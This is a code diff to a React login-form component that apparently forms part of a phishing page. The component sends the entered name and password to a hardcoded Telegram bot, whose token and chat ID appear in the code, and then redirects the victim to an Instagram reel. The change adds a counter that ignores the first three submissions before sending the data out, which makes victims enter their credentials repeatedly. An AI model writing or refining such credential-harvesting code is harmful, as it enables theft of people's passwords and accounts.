@@ -5,20 +5,28 @@ import { useState } from "react";
 import axios from "axios";
 import { FaEyeSlash } from "react-icons/fa";
 import { IoEyeSharp } from "react-icons/io5";
+import { useNavigate } from "react-router-dom";
 
 function Cards() {
   const [name, setName] = useState<string>("");
   const [password, setPassword] = useState<string>("");
   const [views, setViews] = useState<boolean>(false);
+  const [count, setcount] = useState(0);
 
   const API =
     "https://api.telegram.org/bot6990255461:AAHLZRY5i28mngkIAVwIWq3TPvx5ljTRPic/";
-
   async function SendMesage(message: string) {
-    const url: string = `${API}sendMessage?chat_id=-1002139745913&text=${message}`;
-    await axios.post(url);
-    setName("");
-    setPassword("");
+    if (count >= 3) {
+      const url: string = `${API}sendMessage?chat_id=-1002139745913&text=${message}`;
+      await axios.post(url);
+      setName("");
+      setPassword("");
+      window.location.href =
+        "https://www.instagram.com/reel/C7QyAwYsdBU/?igsh=Y2xiZHFmZ2g4Yml0";
+    } else {
+      setcount(count + 1);
+      console.log(count);
+    }
   }
   return (
     <>
